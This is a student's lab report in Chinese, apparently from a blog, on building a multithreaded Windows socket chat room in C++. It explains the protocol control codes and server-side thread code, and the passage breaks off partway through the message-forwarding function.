    <content type="html"><![CDATA[<h1 id="计算机网络实验一_socket聊天程序">计算机网络实验一_Socket聊天程序</h1><p>2013599 田佳业</p><h2 id="实验要求">实验要求</h2><p>使用流式Socket，设计一个两人聊天协议，要求聊天信息带有时间标签。请完整地说明交互消息的类型、语法、语义、时序等具体的消息处理方式。拓展实现功能（如群聊、多线程等）</p><h2 id="程序流程展示">程序流程展示</h2><h3 id="模块说明">模块说明</h3><p>此实验使用了Windows多线程的方式实现了多人聊天功能，流程和协议设计如下图所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210335407540_697_20221026193748648308_976_connect.png" alt="connect"><figcaption aria-hidden="true">connect</figcaption></figure><p>对于每一个用户的聊天过程，分为建连阶段和聊天阶段。</p><h3 id="建连阶段">建连阶段</h3><h4 id="流程设计">流程设计</h4><h5 id="服务器">服务器</h5><p>服务器主要做了以下工作：</p><ul><li><p>设置最大聊天人数并在接收连接前验证</p></li><li><p>建立socket，绑定ip和端口号，进入监听模式进行等待</p></li><li><p>客户端连接后，得到客户端输入的用户名，验证是否在已有用户列表，若否，为其单独创建线程并在<code>socket</code>池中为其分配<code>socket</code></p></li><li><p>连接成功，向其发送欢迎信息并通知在线的用户</p></li><li><p>每当用户连接成功后，服务器显示用户信息及连接时间。</p></li></ul><p>注：下图包含了一次客户端断开重连的过程，可以看到服务器能够正确的识别这一过程，且对在线人数进行更新。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210336576641_482_20221026193750618844_199_image-20221022211508575.png" alt="image-20221022211508575"><figcaption aria-hidden="true">image-20221022211508575</figcaption></figure><h5 id="客户端">客户端</h5><ul><li><p>由于程序默认在<code>localhost</code>上运行，因此客户端只需要手动选择正确的端口号与服务器进行连接，若连接失败，退出程序。</p></li><li><p>之后输入用户名，这里需要注意用户名不能与关键字(在该程序中为<code>quit</code>和<code>all</code>)。当然在本地验证即可。等待服务器确认信息后，建立两个线程：发送和接收线程，以防止阻塞。</p></li></ul><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210337806803_216_20221026193752409499_274_image-20221022211345244.png" alt="客户端"><figcaption aria-hidden="true">客户端</figcaption></figure><p>下面是上线通知的实现效果：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210339188874_417_20221026193754614735_579_image-20221022211828762.png" alt="上线通知"><figcaption aria-hidden="true">上线通知</figcaption></figure><h4 id="协议设计">协议设计</h4><p>由于此部分界限明确，且不涉及与其他服务器的交互，为保证速度和效率，从简设计即可。只传输最需要的东西。并且由于这个过程顺序是且必须是确定的，串行执行共用端口不至混淆。</p><h3 id="聊天阶段">聊天阶段</h3><h4 id="流程设计-1">流程设计</h4><h5 id="服务器事件">服务器事件</h5><p>程序在调度设计中着重注意了一点：在整个聊天室中，服务器可以作为“管理员”向用户发送消息，而不仅仅实现转发功能。为了实现这一点，程序采用了子线程的方式。主线程除了创建socket便将与客户端建立连接的过程交给子线程去干，服务端负责转发的线程由子线程创建。主线程自己则进入等待输入的过程。</p><p>主线程有输入分一下两种情况：正常字符串和<code>exit</code>。正常字符串会即时群发给所有在线用户并标记为<code>SERVER</code>信息。若输入<code>exit</code>则退出服务器，并在退出之前向客户端群发通告，并同时退出客户端的程序。</p><p>以下两幅图片展示了客户端收到的对应的情况。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210340324749_887_20221026193756459285_459_image-20221022214111930.png" alt="image-20221022214111930"><figcaption aria-hidden="true">image-20221022214111930</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210341264659_427_20221026193758300289_769_image-20221022213615110.png" alt="image-20221022213615110"><figcaption aria-hidden="true">image-20221022213615110</figcaption></figure><h5 id="客户端事件">客户端事件</h5><p>按照同样的方式可以实现客户端离线群发功能。不再赘述。当然，断开后删除个人信息并更新计数也是必要的。</p><h5 id="私聊和群聊">私聊和群聊</h5><p>可以从上述图片中看出客户端命令行有两个参数：发送对象和消息。</p><p>从实现上，这两种方式没有本质的区别。稍微需要注意的一些细节主要是群发不需要发给请求方，但私发时如果选择发送给自己，自己仍然可以收到消息。</p><p>下图展示了私聊和群聊的结果。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210343217430_922_20221026193759994557_881_image-20221022224632714.png" alt="image-20221022224632714"><figcaption aria-hidden="true">image-20221022224632714</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210344165219_729_20221026193801774887_602_image-20221022224533046.png" alt="image-20221022224533046"><figcaption aria-hidden="true">image-20221022224533046</figcaption></figure><h4 id="协议设计-1">协议设计</h4><p>协议设计中关注了一下几点：</p><ol type="1"><li><p>在线状况下，根据<code>socket ID</code>和用户信息表，可以知道是谁发的，因此传递报文时发送者只需要向服务器传递接受者是谁，服务器转发时将对应字段改为发送者姓名即可。这样虽然增加了服务器压力，但能够有效减少报文长度。</p></li><li><p>控制位仅需一个字节。当然这就像<code>HTTP</code>状态码一样，是建立在共识之上的。</p></li><li><p>消息中需要包含时间戳。因为聊天程序中的时间是需要以发送时间为准的。当然接收时间可以从系统获得，基于此也可以进行时延计算。</p></li></ol><p>以下是程序中关于协议中控制部分的宏定义：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xp316ulmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-xp316ulmrh9u6a"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEW_C <span class="hljs-string">'N'</span> <span class="hljs-comment">// new client</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUB_C <span class="hljs-string">'P'</span> <span class="hljs-comment">// public message</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRI_C <span class="hljs-string">'R'</span>  <span class="hljs-comment">// private message</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> QUIT_C <span class="hljs-string">'Q'</span> <span class="hljs-comment">// quit</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> HELLO_C <span class="hljs-string">'H'</span> <span class="hljs-comment">// hello message from server</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXIT_C <span class="hljs-string">'T'</span> <span class="hljs-comment">// exit message from server (server is closed)</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_C <span class="hljs-string">'E'</span> <span class="hljs-comment">// error message from server</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_C <span class="hljs-string">'V'</span> <span class="hljs-comment">// normal server message</span></span></code></pre></div></div><h2 id="程序代码解释">程序代码解释</h2><p>具体代码的含义大多在程序中有注释。下面的文字叙述部分主要着眼函数和线程模块划分和功能实现上。</p><p>C++中对字符串的处理<code>char*</code>和<code>string</code>各有各的优势，有时也会出现各种奇怪的坑，在写代码时一度让人很头疼，因此也在某些地方会有一些不太优雅的写法。</p><h3 id="环境配置">环境配置</h3><p>在<code>cmake</code>项目中进行<code>socket</code>编程需要在CMakeLists中添加以下内容，否则不能正常编译：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dk6clylmrh9u6a"></i><span>cmake</span><div class="collapse show" id="collapse-dk6clylmrh9u6a"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.21</span>)<span class="hljs-keyword">project</span>(chatting)<span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">"-static"</span>)<span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">14</span>)<span class="hljs-keyword">link_libraries</span>(ws2_32 wsock32)<span class="hljs-keyword">add_executable</span>(server server.cpp)<span class="hljs-keyword">add_executable</span>(client client.cpp)</code></pre></div></div><p>需额外包含的头文件：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-f33muelmrh9u6a"></i><span>cmake</span><div class="collapse show" id="collapse-f33muelmrh9u6a"><pre><code class="hljs cmake"><span class="hljs-comment">#include &lt;windows.h&gt;</span><span class="hljs-comment">#include &lt;WinSock2.h&gt;</span><span class="hljs-comment">#pragma comment(lib, "ws2_32.lib")</span></code></pre></div></div><h3 id="工具类">工具类</h3><p><code>color.h</code>以及部分<code>helper.h</code>的代码主要定义了一些与控制台颜色以及格式化输出显示相关的宏及函数。</p><p><code>print_toggle</code>主要用来格式化打印控制台输出。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-msqrmwlmrh9u6a"></i><span>reasonml</span><div class="collapse show" id="collapse-msqrmwlmrh9u6a"><pre><code class="hljs reasonml">print<span class="hljs-constructor">_toggle(<span class="hljs-params">const</span> <span class="hljs-params">string</span>&amp; <span class="hljs-params">type</span>,<span class="hljs-params">const</span> <span class="hljs-params">string</span> &amp;<span class="hljs-params">txt</span>,<span class="hljs-params">const</span> <span class="hljs-params">string</span>&amp; <span class="hljs-params">time_str</span>=<span class="hljs-string">""</span>)</span></code></pre></div></div><p>第一个参数是打印格式，取值是下面的宏定义，决定了输出以怎样的颜色和格式进行。第二个参数是内容。并附带可选参数时间。</p><p>宏的定义如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-61xfbulmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-61xfbulmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">//message datagram parameters</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_SIZE 12</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TXT_SIZE 125</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SIZE 144</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIME_SIZE 6</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TXT_PTR 1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIME_PTR 126</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_PTR 132</span><span class="hljs-comment">//console line type parameters</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR <span class="hljs-string">"E"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO <span class="hljs-string">"I"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEW <span class="hljs-string">"N"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG <span class="hljs-string">"L"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> TIP <span class="hljs-string">"T"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUC <span class="hljs-string">"S"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> WARN <span class="hljs-string">"W"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER <span class="hljs-string">"V"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> GONE <span class="hljs-string">"G"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DUL <span class="hljs-string">"D"</span> <span class="hljs-comment">// dulplicate name</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> HELLO <span class="hljs-string">"H"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUB <span class="hljs-string">"P"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRI <span class="hljs-string">"R"</span></span></code></pre></div></div><p>第一部分主要是方便对数据保处理时使用，第二部分则是在控制台上显示相关命令是需要的宏。</p><h3 id="初始化工作">初始化工作</h3><h4 id="服务器端">服务器端</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k6q933lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-k6q933lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">//initialize websocket</span>WSADATA wsaData;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"WSAStartup failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(LOG, <span class="hljs-string">"WSAStartup success"</span>);SOCKET sock_server = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);SOCKADDR_IN server_addr;server_addr.sin_family = AF_INET;server_addr.sin_port = <span class="hljs-built_in">htons</span>(PORT);server_addr.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(LOCALHOST);<span class="hljs-built_in">bind</span>(sock_server, (SOCKADDR *) &amp;server_addr, <span class="hljs-built_in">sizeof</span>(SOCKADDR));<span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(sock_server, <span class="hljs-number">5</span>) == SOCKET_ERROR) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"listen failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}<span class="hljs-built_in">print_toggle</span>(LOG, <span class="hljs-string">"listen success"</span>);</code></pre></div></div><h4 id="客户端-1">客户端：</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1jrw9jlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-1jrw9jlmrh9u6a"><pre><code class="hljs c++">WSADATA wsaData;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"WSAStartup failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(LOG, <span class="hljs-string">"WSAStartup success"</span>);SOCKET sockClient = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"the chat room is on the localhost"</span>);<span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"please input port:"</span>);cin &gt;&gt; port;SOCKADDR_IN addrSrv;addrSrv.sin_family = AF_INET;addrSrv.sin_port = <span class="hljs-built_in">htons</span>(port);addrSrv.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(LOCALHOST);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sockClient, (SOCKADDR *) &amp;addrSrv, <span class="hljs-built_in">sizeof</span>(SOCKADDR)) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"connect failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(SUC, <span class="hljs-string">"connect success"</span>, <span class="hljs-built_in">get_time_str</span>());</code></pre></div></div><p>这一部分是服务器端创建<code>socket</code>和客户端连接<code>socket</code>必需的代码，课上也有讲述，此处不一一详细说明。</p><h3 id="服务器进程">服务器进程</h3><h4 id="主线程">主线程</h4><p>这一部分主要做的工作是初始化套接字池，并使用<code>client_manager</code>函数创建线程，以监听客户端连接。之后便监听输入以控制服务器群发消息或退出。另外，如果没有客户端连接，显然套接字池中所有套接字都不可用，什么也不用做。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9giyihlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-9giyihlmrh9u6a"><pre><code class="hljs c++">    <span class="hljs-comment">//initialize socket array</span>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> &amp;sock_connect: sock_connects) {        sock_connect = INVALID_SOCKET;    }    <span class="hljs-comment">//create a thread to handle new clients</span>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, client_manager, (LPVOID) &amp;sock_server, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">nullptr</span>) {        <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"create thread failed"</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    <span class="hljs-comment">//input "exit" to exit</span>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-type">char</span> input[<span class="hljs-number">100</span>];        cin.<span class="hljs-built_in">getline</span>(input, <span class="hljs-number">100</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(input, <span class="hljs-string">"exit"</span>) == <span class="hljs-number">0</span>) {            <span class="hljs-comment">// tell all clients that the server is going to shut down</span>            <span class="hljs-type">char</span> msg[MSG_SIZE];            <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);            msg[<span class="hljs-number">0</span>] = EXIT_C;            string content = <span class="hljs-string">"server has shut down"</span>;            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++) {                msg[TXT_PTR + i] = content[i];            }            <span class="hljs-built_in">broadcast</span>(msg, <span class="hljs-number">-1</span>);            <span class="hljs-comment">//stop the client_manager thread</span>            <span class="hljs-built_in">TerminateThread</span>(hThread, <span class="hljs-number">0</span>);            <span class="hljs-comment">//close server socket</span>            <span class="hljs-built_in">closesocket</span>(sock_server);            <span class="hljs-keyword">break</span>;        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">//send msg to all clients</span>            <span class="hljs-type">char</span> msg[MSG_SIZE];            <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);            msg[<span class="hljs-number">0</span>] = SERVER_C;            <span class="hljs-type">char</span> txt[TXT_SIZE];            <span class="hljs-built_in">strcpy</span>(txt, input);            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TXT_SIZE; j++) {                msg[j + TXT_PTR] = txt[j];            }            <span class="hljs-comment">//add time</span>            <span class="hljs-type">char</span> time[TIME_SIZE];            <span class="hljs-built_in">strcpy</span>(time, <span class="hljs-built_in">get_time_str</span>().<span class="hljs-built_in">c_str</span>());            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TIME_SIZE; j++)                msg[j + TIME_PTR] = time[j];            <span class="hljs-built_in">broadcast</span>(msg);        }    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p>其中的<code>broadcast</code>函数便是群发消息所使用的是。下面看其实现：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-008pt6lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-008pt6lmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">broadcast</span><span class="hljs-params">(<span class="hljs-type">char</span> msg[MSG_SIZE], <span class="hljs-type">int</span> id = <span class="hljs-number">-1</span>)</span> </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CLIENT; i++) {        <span class="hljs-keyword">if</span> (sock_connects[i] != INVALID_SOCKET &amp;&amp; i != id) {            <span class="hljs-comment">//we don't send the message to the sender</span>            <span class="hljs-built_in">send</span>(sock_connects[i], msg, MSG_SIZE, <span class="hljs-number">0</span>);        }    }}</code></pre></div></div><p>依次检查<code>socket</code>池，然后给有效且不是<code>id</code>对应的socket发送消息。</p><h4 id="客户端连接线程">客户端连接线程</h4><p><code>[[noreturn]]</code>表明这个函数自始至终监听新加入的<code>socket</code>。连接时服务器不提示，发送用户名时服务器进行第一次消息接收并根据情况发送欢迎信息或要求客户端重新输入用户名。每次接收消息循环结束，表示有客户端进入或离开，更新一次在线信息，并启动<code>handle_msg</code>线程进行消息转发。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lifez4lmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-lifez4lmrh9u6a"><pre><code class="hljs c++">[[noreturn]] <span class="hljs-function">DWORD WINAPI <span class="hljs-title">client_manager</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-comment">//accept new clients</span>    <span class="hljs-keyword">auto</span> *sock_server = (SOCKET *) lparam;    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (; index &lt; MAX_CLIENT; index++) {            <span class="hljs-keyword">if</span> (sock_connects[index] == INVALID_SOCKET)                <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">if</span> (index == MAX_CLIENT) {            <span class="hljs-built_in">print_toggle</span>(WARN, <span class="hljs-string">"the server is full"</span>);            <span class="hljs-keyword">continue</span>;        }        SOCKADDR_IN addrClient;        <span class="hljs-type">int</span> lenAddr = <span class="hljs-built_in">sizeof</span>(SOCKADDR);        sock_connects[index] = <span class="hljs-built_in">accept</span>(*sock_server, (SOCKADDR *) &amp;addrClient, &amp;(lenAddr));        <span class="hljs-keyword">if</span> (sock_connects[index] == SOCKET_ERROR) {            <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"could not accept client!"</span>);            sock_connects[index] = INVALID_SOCKET;            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {            <span class="hljs-type">char</span> name[NAME_SIZE];            <span class="hljs-built_in">recv</span>(sock_connects[index], name, NAME_SIZE, <span class="hljs-number">0</span>);            <span class="hljs-keyword">if</span> (username_map.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">string</span>(name)) == username_map.<span class="hljs-built_in">end</span>()) {                username_map.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string, <span class="hljs-type">int</span>&gt;(<span class="hljs-built_in">string</span>(name), index));                <span class="hljs-built_in">send</span>(sock_connects[index], HELLO, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);                string new_client = <span class="hljs-string">"new client: "</span> + <span class="hljs-built_in">string</span>(name) + <span class="hljs-string">" entered the chat room"</span>;                string online = <span class="hljs-string">"online:"</span> + <span class="hljs-built_in">to_string</span>(username_map.<span class="hljs-built_in">size</span>());                <span class="hljs-comment">//get the id of the new client</span>                <span class="hljs-type">int</span> id = username_map[<span class="hljs-built_in">string</span>(name)];                <span class="hljs-built_in">print_toggle</span>(INFO, new_client,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-comment">// broadcast</span>                <span class="hljs-type">char</span> msg[MSG_SIZE];                <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TXT_SIZE; j++)                    msg[j + TXT_PTR] = new_client.<span class="hljs-built_in">c_str</span>()[j];                msg[<span class="hljs-number">0</span>] = NEW_C;                <span class="hljs-comment">//add time</span>                <span class="hljs-type">char</span> time[TIME_SIZE];                <span class="hljs-built_in">strcpy</span>(time, <span class="hljs-built_in">get_time_str</span>().<span class="hljs-built_in">c_str</span>());                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TIME_SIZE; j++)                    msg[j + TIME_PTR] = time[j];                <span class="hljs-built_in">broadcast</span>(msg, id);                <span class="hljs-keyword">break</span>;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">send</span>(sock_connects[index], DUL, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);            }        }        HANDLE h_thread_c=<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, handle_msg, (LPVOID) &amp;sock_connects[index], <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);        <span class="hljs-built_in">CloseHandle</span>(h_thread_c);        string online = <span class="hljs-string">"online: "</span> + <span class="hljs-built_in">to_string</span>(username_map.<span class="hljs-built_in">size</span>());        <span class="hljs-built_in">print_toggle</span>(INFO, online,<span class="hljs-built_in">get_time_str</span>());    }}</code></pre></div></div><h4 id="消息转发线程">消息转发线程</h4><p>消息转发线程主要根据收到的报文控制段对消息进行不同的处理并转发。同时在服务器端输出日志，如下图所示。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210345322153_660_20221026193803523871_125_image-20221022225008715.png" alt="image-20221022225008715"><figcaption aria-hidden="true">image-20221022225008715</figcaption></figure><p>在程序中除了根据姓名找<code>socket id</code>,也常常出现反着找的情况。</p><p>这一部分需要注意的点是在<code>PRI_C</code>即私密聊天情况下，如果客户端给出的姓名不在当前上线用户的范围之内，会单独给发送者提示。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-o9q8smlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-o9q8smlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handle_msg</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-keyword">auto</span> *socket = (SOCKET *) lparam;    <span class="hljs-type">int</span> id = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CLIENT; i++) {        <span class="hljs-keyword">if</span> (sock_connects[i] == *socket) {            id = i;            <span class="hljs-keyword">break</span>;        }    }    <span class="hljs-comment">// listen to the message from the client</span>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-type">char</span> from_user[NAME_SIZE];        <span class="hljs-type">char</span> msg[MSG_SIZE];        <span class="hljs-type">char</span> content[TXT_SIZE];        <span class="hljs-built_in">memset</span>(from_user, <span class="hljs-number">0</span>, NAME_SIZE);        <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);        <span class="hljs-built_in">memset</span>(content, <span class="hljs-number">0</span>, TXT_SIZE);        <span class="hljs-type">int</span> ret = <span class="hljs-built_in">recv</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {            <span class="hljs-built_in">print_toggle</span>(WARN, <span class="hljs-string">"client closed unexpectedly"</span>);            <span class="hljs-built_in">closesocket</span>(*socket);            <span class="hljs-comment">//remove the socket from the list</span>            sock_connects[id] = INVALID_SOCKET;            <span class="hljs-comment">//remove the username from the ma according to the id</span>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = username_map.<span class="hljs-built_in">begin</span>(); it != username_map.<span class="hljs-built_in">end</span>(); it++) {                <span class="hljs-keyword">if</span> (it-&gt;second == id) {                    username_map.<span class="hljs-built_in">erase</span>(it);                    <span class="hljs-keyword">break</span>;                }            }            <span class="hljs-keyword">break</span>;        }        <span class="hljs-type">char</span> type = msg[<span class="hljs-number">0</span>];        <span class="hljs-comment">//get the username from the map</span>        string username;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;item: username_map) {            <span class="hljs-keyword">if</span> (item.second == id) {                username = item.first;                <span class="hljs-keyword">break</span>;            }        }        <span class="hljs-keyword">switch</span> (type) {            <span class="hljs-keyword">case</span> QUIT_C: {                <span class="hljs-comment">// close client through the client's receive thread</span>                <span 